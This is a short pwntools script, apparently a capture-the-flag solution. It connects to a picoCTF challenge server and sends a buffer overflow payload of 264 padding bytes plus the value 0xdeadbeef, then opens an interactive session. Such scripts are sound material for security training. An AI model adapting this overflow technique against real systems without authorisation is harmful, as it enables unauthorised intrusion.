from pwn import *

r = remote("mars.picoctf.net",31890)
payload = b"A"*264 + p64(0xdeadbeef)
r.sendline(payload)
r.interactive()